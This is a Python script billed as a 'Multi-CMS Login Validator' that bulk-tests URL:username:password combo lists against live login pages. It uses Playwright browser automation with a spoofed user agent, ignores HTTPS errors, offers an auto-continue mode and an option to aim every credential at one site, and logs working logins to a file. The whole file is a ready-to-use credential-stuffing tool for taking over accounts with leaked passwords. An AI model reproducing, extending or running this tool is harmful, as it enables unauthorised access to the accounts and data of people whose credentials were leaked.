#!/usr/bin/env python3
"""
validator.py – Multi-CMS Login Validator (Playwright Edition)
Input format: URL|username:password or URL:username:password
Built by unknone hart
"""

import os
import sys
import signal
import asyncio
import re
from collections import defaultdict

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    print("[!] Playwright is required. Run: pip3 install playwright && playwright install chromium")
    sys.exit(1)


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


BANNER = f"""
 {Colors.BLUE}__   __    _ _    _      _               __   __  _ _{Colors.RESET}
 {Colors.BLUE}\\ \\ / /_ _| (_)__| |__ _| |_ ___  _ _   \\ \\ / / (_) |{Colors.RESET}
 {Colors.BLUE} \\ V / _` | | / _` / _` |  _/ _ \\| '_|   \\ V /  | | |{Colors.RESET}
 {Colors.BLUE}  \\_/\\__,_|_|_\\__,_\\__,_|\\__\\___/|_|      \\_/   |_|_|{Colors.RESET}

     {Colors.BOLD}[ Browser Automation Validator ]{Colors.RESET}
     {Colors.YELLOW}Built by unknone hart{Colors.RESET}
"""

_loading_chars = ['⢿', '⣻', '⣽', '⣾', '⣷', '⣯', '⣟', '⡿']

def show_loading(message="Loading", duration=1.5):
    import time
    import sys
    start = time.time()
    i = 0
    while time.time() - start < duration:
        sys.stdout.write(f"\r{Colors.YELLOW}[{_loading_chars[i % len(_loading_chars)]}] {message}...{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write(f"\r{Colors.GREEN}[✓] {message} complete{Colors.RESET}\n")
    sys.stdout.flush()

_exit_requested = False


def _parse_line(raw: str) -> tuple[str, str, str] | None:
    line = raw.strip().lstrip('\ufeff')
    
    # Try pipe-separated format first: URL|username|password
    if '|' in line:
        parts = line.split('|')
        if len(parts) >= 3:
            url = parts[0].strip()
            username = parts[1].strip()
            password = '|'.join(parts[2:]).strip()  # password may contain |
            
            # Validate URL starts with http/https
            if url.lower().startswith(('http://', 'https://')):
                return url, username, password
    
    # Fall back to colon-separated format: URL:username:password
    parts = line.split(":")
    if len(parts) < 4:
        return None
    scheme = parts[0].lower()
    if scheme not in ("http", "https"):
        return None
    url_parts = [parts[0], parts[1]]
    i = 2
    while i < len(parts) and "/" in parts[i]:
        url_parts.append(parts[i])
        i += 1
    if i >= len(parts):
        return None
    url = ":".join(url_parts)
    username = parts[i]
    i += 1
    if i >= len(parts):
        return None
    password = ":".join(parts[i:])
    return url, username, password


def _tty_input(prompt_text: str) -> str:
    try:
        with open("/dev/tty", "r") as tty:
            sys.stdout.write(prompt_text)
            sys.stdout.flush()
            return tty.readline().rstrip("\n")
    except OSError:
        return input(prompt_text)


def read_entries(source) -> list[tuple[str, str, str]]:
    entries = []
    if isinstance(source, (str, bytes, os.PathLike)):
        fh = open(source, "r", encoding="utf-8", errors="ignore")
        close_after = True
    else:
        fh = source
        close_after = False
    try:
        for lineno, raw in enumerate(fh, 1):
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            parsed = _parse_line(line)
            if parsed:
                entries.append(parsed)
    finally:
        if close_after:
            fh.close()
    return entries


def _is_valid_email_format(email: str) -> bool:
    """Check if string looks like a valid email address."""
    if not email or '@' not in email:
        return False
    # Basic email pattern: something@something.something
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))
def _is_login_blocked_by_validation(page, email_value: str) -> bool:
    """
    Check if the email field has browser-native validation blocking submission.
    Returns True if validation is blocking (login FAILED).
    """
    return page.evaluate('''
    () => {
        // Find email/user input fields
        const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="user"], input[id*="email"], input[id*="user"]');
        
        for (const input of emailInputs) {
            if (!input.offsetParent) continue; // Skip hidden
            
            // Check HTML5 validationMessage (the browser's built-in error)
            if (input.validationMessage && input.validationMessage.length > 0) {
                const msg = input.validationMessage.toLowerCase();
                // Check for email-specific validation
                if (msg.includes('@') || msg.includes('email') || msg.includes('valid') || msg.includes('include') || msg.includes('format')) {
                    return true;
                }
            }
            
            // Check :invalid pseudo-class
            if (input.matches(':invalid')) {
                const type = input.type || input.getAttribute('type');
                if (type === 'email') {
                    return true;
                }
            }
            
            // Check for custom validation attributes
            if (input.hasAttribute('aria-invalid') && input.getAttribute('aria-invalid') === 'true') {
                return true;
            }
        }
        
        return false;
    }
    ''')


def play_login(page, url: str, username: str, password: str) -> bool:
    """
    Try to login. Returns True ONLY if we're confident it succeeded.
    """
    # === PRE-VALIDATION: Check email format first ===
    # If username doesn't look like an email, check if the form requires email
    # Many login pages require email format
    if not _is_valid_email_format(username):
        # Username is not a valid email format
        # Try to detect if the form expects email by looking at the input type/placeholder
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
        except:
            return False
        
        page.wait_for_timeout(500)
        
        # Check if email field expects email format
        email_inputs = page.locator('input[type="email"], input[name*="email"]').all()
        if email_inputs:
            # If there's an email type input and username isn't valid email, skip
            # This prevents false positives on forms with HTML5 email validation
            return False
    
    # Navigate to page
    try:
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
    except:
        return False
    
    page.wait_for_timeout(1000)
    
    # Find username/email and password fields using specific selectors (like test_pw.py)
    # Priority: type="email" > name/id contains email > type="text" in form
    email_input = None
    pass_input = None
    
    # Try specific email selectors first
    try:
        email_input = page.locator("input[type='email']").first
        if not email_input.is_visible():
            email_input = None
    except:
        pass
    
    # Try name/id attributes if type selector didn't work
    if not email_input:
        try:
            email_input = page.locator("input[name*='email'], input[id*='email']").first
            if not email_input.is_visible():
                email_input = None
        except:
            pass
    
    # Password field - always type="password"
    try:
        pass_input = page.locator("input[type='password']").first
        if not pass_input.is_visible():
            pass_input = None
    except:
        pass
    
    if not email_input or not pass_input:
        # Fallback: old method but exclude search fields
        inputs = page.locator("input:visible").all()
        for inp in inputs:
            itype = inp.get_attribute("type")
            iname = (inp.get_attribute("name") or "").lower()
            iid = (inp.get_attribute("id") or "").lower()
            pholder = (inp.get_attribute("placeholder") or "").lower()
            sig = f"{itype} {iname} {iid} {pholder}"
            
            # Skip search fields
            if "search" in sig or "q" == iname or iid == "q":
                continue
            
            if itype == "password":
                pass_input = inp
            elif itype == "email" or ("email" in sig and "user" in sig):
                if not email_input:
                    email_input = inp
            elif itype in ("text", "") and not email_input:
                if any(x in sig for x in ["user", "email", "log", "name", "id"]):
                    email_input = inp
    
    if not email_input or not pass_input:
        return False
    
    # Fill credentials
    try:
        email_input.fill(username)
        pass_input.fill(password)
    except:
        return False
    
    # Track auth API responses
    auth_error = False
    auth_called = False
    
    def on_response(response):
        nonlocal auth_error, auth_called
        if response.request.method in ("POST", "PUT"):
            rurl = response.url.lower()
            if any(x in rurl for x in ["login", "auth", "signin", "token", "authenticate"]):
                auth_called = True
                if response.status >= 400:
                    auth_error = True
    
    page.on("response", on_response)
    
    # Click submit button - use specific selector like test_pw.py
    submit = None
    try:
        # Try exact "Sign In" text first (like test_pw.py)
        submit = page.locator("button:has-text('Sign In')").first
        if not submit.is_visible():
            submit = None
    except:
        pass
    
    if not submit:
        try:
            # Try other common button texts
            for btn_text in ["Login", "Log In", "Submit", "Continue"]:
                submit = page.locator(f"button:has-text('{btn_text}')").first
                if submit and submit.is_visible():
                    break
                submit = None
        except:
            pass
    
    if not submit:
        # Fallback: any button near the password field or generic submit
        buttons = page.locator("button:visible, input[type='submit']:visible").all()
        for btn in buttons:
            txt = (btn.inner_text() or "").lower() + (btn.get_attribute("value") or "").lower()
            if any(w in txt for w in ["log", "sign", "submit", "enter"]):
                submit = btn
                break
        if not submit and buttons:
            submit = buttons[0]
    
    try:
        if submit:
            submit.click(timeout=5000)
        else:
            pass_input.press("Enter")
    except:
        page.remove_listener("response", on_response)
        return False
    
    # Wait for network/response
    try:
        page.wait_for_load_state("networkidle", timeout=4000)
    except:
        page.wait_for_timeout(3000)
    
    # CRITICAL: Wait for validation/error messages to render (toasts take longer)
    page.wait_for_timeout(3000)
    page.remove_listener("response", on_response)
    
    # === DECISION LOGIC ===
    # Order matters: check for failures first, then success
    
    # 0. Check if still on same page with password field intact = validation blocked submission
    curr = page.url.split('?')[0].rstrip('/').lower()
    orig = url.split('?')[0].rstrip('/').lower()
    
    # Check if password field still has our value - indicates form didn't submit
    try:
        password_still_filled = False
        for i in range(page.locator("input[type='password']").count()):
            pf = page.locator("input[type='password']").nth(i)
            if pf.is_visible():
                try:
                    val = pf.input_value()
                    if val == password and len(password) > 0:
                        password_still_filled = True
                        break
                except:
                    pass
        if password_still_filled:
            # Form didn't actually submit - validation likely blocked it
            return False
    except:
        pass
    
    # 1. API returned error = definite failure
    if auth_called and auth_error:
        return False
    
    # 2. Check for browser-native email validation blocking submission
    if _is_login_blocked_by_validation(page, username):
        return False  # Validation blocked the login
    
    # 3. Check for visible error messages BEFORE checking success words
    error_keywords = ["invalid", "incorrect", "wrong", "failed", "error", "unauthorized", 
                     "denied", "bad credentials", "does not match", "not found", "try again",
                     "valid email", "email format", "missing", "proper"]
    
    body = page.inner_text("body").lower()
    
    # Check common error element selectors - expanded for toast notifications
    error_selectors = [
        "[role='alert']", ".error", ".alert-danger", ".invalid-feedback", ".field-error", ".help-block",
        ".toast", ".notification", ".message", ".flash-message", ".alert", ".banner", ".snackbar",
        ".toast-error", ".alert-error", ".message-error", ".form-error", ".login-error",
        "[class*='error']", "[class*='toast']", "[class*='alert']", "[class*='message']"
    ]
    
    for selector in error_selectors:
        try:
            els = page.locator(selector)
            count = els.count()
            for i in range(count):
                el = els.nth(i)
                if el.is_visible():
                    txt = el.inner_text().lower()
                    if any(kw in txt for kw in error_keywords):
                        return False
        except:
            pass
    
    # Also check page content directly for common error phrases
    if "invalid email or password" in body or "invalid email" in body or "wrong password" in body:
        return False
    
    # Check body text for errors (only if still on login page)
    if any(x in curr for x in ["login", "signin", "auth"]):
        if any(kw in body for kw in error_keywords):
            return False
    
    # 4. URL changed away from login page = likely success
    if curr != orig and not any(x in curr for x in ["login", "signin", "auth", "account/login"]):
        return True
    
    # 5. Check for clear success indicators in page content (only if URL changed or we're clearly not on login page)
    # Be more strict: require URL change OR presence of multiple success indicators
    success_words = ["dashboard", "my account", "logout", "sign out", "profile"]
    if '@' in username:
        success_words.append(f"hi {username.split('@')[0].lower()}")
    
    # Only consider success words if URL actually changed
    if curr != orig:
        if any(w and w in body for w in success_words):
            return True
    
    # Default: if URL didn't change and no clear success signal, assume failure
    if curr == orig:
        return False
    
    return True


def graceful_exit(playwright_context=None, browser=None):
    global _exit_requested
    if _exit_requested:
        os._exit(0)
    _exit_requested = True
    
    # Clean up Playwright resources first
    try:
        if browser:
            browser.close()
    except:
        pass
    
    # Cancel asyncio tasks to suppress Future warnings
    try:
        loop = asyncio.get_event_loop()
        if loop and not loop.is_closed():
            for t in asyncio.all_tasks(loop):
                if not t.done():
                    t.cancel()
    except:
        pass
    
    print(f"\n{Colors.YELLOW}[!] Interrupted by user. good bye thank for using me{Colors.RESET}")
    os._exit(0)


def main():
    global _exit_requested
    
    print(BANNER)
    
    # Aggressive signal handling - use default handler until browser is created
    signal.signal(signal.SIGINT, lambda s, f: graceful_exit())
    signal.signal(signal.SIGTERM, lambda s, f: graceful_exit())
    
    # Show loading animation
    show_loading("Initializing validator", 1.0)
    
    args = sys.argv[1:]
    bl_url = None
    auto_continue = False
    multi_files = []
    
    # Parse --ms for multiple files
    if "--ms" in args:
        idx = args.index("--ms")
        # Collect all files after --ms until next flag or end
        i = idx + 1
        while i < len(args) and not args[i].startswith("-"):
            multi_files.append(args[i])
            i += 1
        # Remove --ms and the file args from args list
        args = args[:idx] + args[i:]
        if multi_files:
            print(f"{Colors.YELLOW}[*] Multi-file mode: {len(multi_files)} files{Colors.RESET}")
            for mf in multi_files:
                print(f"    - {mf}")
    
    if "--c" in args:
        auto_continue = True
        args.remove("--c")
        print(f"{Colors.YELLOW}[*] Auto-continue mode: will test all URLs without asking{Colors.RESET}")
    
    if "--bl" in args:
        idx = args.index("--bl")
        if idx + 1 < len(args):
            bl_url = args[idx + 1]
            args.pop(idx)
            args.pop(idx)
        else:
            print(f"{Colors.RED}[!] --bl flag given but no URL specified.{Colors.RESET}")
            sys.exit(1)
    
    piped = not sys.stdin.isatty()
    entries = []
    base_name = "multi"
    output_file = "successful_multi.txt"
    
    if piped:
        source = sys.stdin
        base_name = "stdin"
        output_file = "successful_stdin.txt"
        print(f"{Colors.BLUE}[*] Reading from stdin (piped)...{Colors.RESET}")
        entries = read_entries(source)
    elif multi_files:
        # Process multiple files
        for mf in multi_files:
            if not os.path.exists(mf):
                print(f"{Colors.RED}[!] File not found: {mf}{Colors.RESET}")
                continue
            print(f"{Colors.BLUE}[*] Loading {mf}...{Colors.RESET}")
            file_entries = read_entries(mf)
            entries.extend(file_entries)
            print(f"    {len(file_entries)} entries loaded")
        if not entries:
            print(f"{Colors.RED}[!] No valid entries found in any file.{Colors.RESET}")
            sys.exit(1)
    elif args:
        source = args[0]
        if not os.path.exists(source):
            print(f"{Colors.RED}[!] File not found: {source}{Colors.RESET}")
            sys.exit(1)
        base_name = os.path.splitext(os.path.basename(source))[0]
        output_file = f"successful_{base_name}.txt"
        entries = read_entries(source)
    else:
        source = "loginlist.txt"
        if not os.path.exists(source):
            print(f"{Colors.RED}[!] Default file 'loginlist.txt' not found.{Colors.RESET}")
            sys.exit(1)
        base_name = "loginlist"
        output_file = "successful_loginlist.txt"
        entries = read_entries(source)
    
    if not entries:
        print(f"{Colors.RED}[!] No valid entries found.{Colors.RESET}")
        sys.exit(1)
    
    print(f"{Colors.BLUE}[*] Loaded {len(entries)} credential(s).{Colors.RESET}")
    if bl_url:
        print(f"{Colors.BLUE}[*] --bl override active: testing ALL against {bl_url}{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Output → {output_file}{Colors.RESET}\n")
    
    grouped = defaultdict(list)
    for orig_url, user, passwd in entries:
        target = bl_url if bl_url else orig_url
        grouped[target].append((user, passwd))
    
    successful = []
    total_tested = 0
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)
            context = browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
                ignore_https_errors=True
            )
            
            for url, creds in grouped.items():
                print(f"\n{Colors.BOLD}{'─'*60}{Colors.RESET}")
                print(f"{Colors.BLUE}[>] Found Login Batch:{Colors.RESET} {url}  {Colors.YELLOW}(Testing {len(creds)} creds){Colors.RESET}")
                
                active_url = url
                skip_batch = False
                
                # Skip prompt if auto-continue mode
                if not auto_continue:
                    while True:
                        if _exit_requested:
                            graceful_exit(browser=browser)
                        print(f"    {Colors.BOLD}Is this a valid login page to test?{Colors.RESET}")
                        print(f"      {Colors.GREEN}[1]{Colors.RESET} Yes: {active_url}")
                        print(f"      {Colors.YELLOW}[2]{Colors.RESET} Change URL")
                        print(f"      {Colors.RED}[3]{Colors.RESET} Skip batch")
                        choice = _tty_input("      Choice (1/2/3): ").strip()
                        if choice == "3":
                            skip_batch = True
                            break
                        elif choice == "2":
                            new_u = _tty_input("      New URL: ").strip()
                            if new_u:
                                active_url = new_u
                        elif choice == "1":
                            break
                else:
                    print(f"    {Colors.GREEN}[AUTO]{Colors.RESET} Testing: {active_url}")
                
                if skip_batch or _exit_requested:
                    continue
                
                print(f"{Colors.BLUE}[*] Testing {len(creds)} credentials...{Colors.RESET}")
                page = context.new_page()
                
                for idx, (user, passwd) in enumerate(creds, 1):
                    if _exit_requested:
                        graceful_exit(browser=browser)
                    
                    total_tested += 1
                    label = f"[{idx}/{len(creds)}]"
                    print(f"    {label} {user}:{passwd} … ", end="", flush=True)
                    
                    if play_login(page, active_url, user, passwd):
                        print(f"{Colors.GREEN}✓ SUCCESS{Colors.RESET}")
                        line = f"{active_url}:{user}:{passwd}"
                        successful.append(line)
                        with open(output_file, "a", encoding="utf-8") as f:
                            f.write(line + "\n")
                        page.close()
                        page = context.new_page()
                    else:
                        print(f"{Colors.RED}✗ failed{Colors.RESET}")
                        context.clear_cookies()
                
                page.close()
            browser.close()
        
        print(f"\n{Colors.BOLD}{'═'*60}{Colors.RESET}")
        print(f"{Colors.BLUE}[*] Done. Tested: {total_tested} | Successful: {len(successful)}{Colors.RESET}")
        if successful:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("\n".join(successful) + "\n")
            print(f"{Colors.GREEN}[+] Saved to: {output_file}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[!] No successful logins.{Colors.RESET}")
    
    except Exception as e:
        if not _exit_requested:
            print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        try:
            graceful_exit(browser=browser)
        except UnboundLocalError:
            graceful_exit(browser=None)


if __name__ == "__main__":
    main()